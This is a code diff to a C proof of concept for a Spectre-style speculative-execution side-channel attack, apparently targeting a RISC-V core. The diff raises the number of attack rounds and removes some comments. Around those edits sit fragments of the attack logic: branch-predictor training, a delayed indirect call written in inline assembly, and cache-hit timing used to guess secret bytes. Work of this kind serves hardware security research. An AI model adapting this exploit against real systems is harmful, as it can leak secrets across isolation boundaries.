@@ -4,8 +4,8 @@
 #include "cache.h"
 
 #define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
-#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
-#define ATTACK_SAME_ROUNDS 1 // amount of times to attack the same index
+#define ROUNDS 1 
+#define ATTACK_SAME_ROUNDS 5
 #define SECRET_SZ 1
 #define CACHE_HIT_THRESHOLD 50
 
@@ -73,12 +73,11 @@ int main(void){
 
     // try to read out the secret
     for(uint64_t len = 0; len < SECRET_SZ; ++len){
-
         // clear results every round
         for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
             results[cIdx] = 0;
         }
-
+	    
         // run the attack on the same idx ATTACK_SAME_ROUNDS times
         for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
 
@@ -103,8 +102,6 @@ int main(void){
                 for(uint64_t k = 0; k < 30; ++k){
                     asm("");
                 }
-
-	//	printf("ps:%ld ",passInIdx);
 
                 // this calls the function using jalr and delays the addr passed in through fdiv
                 asm("addi %[addr], %[addr], -2\n"
@@ -142,7 +139,6 @@ int main(void){
         uint8_t output[2];
         uint64_t hitArray[2];
         topTwoIdx(results, 256, output, hitArray);
-
         printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
 
         // read in the next secret 
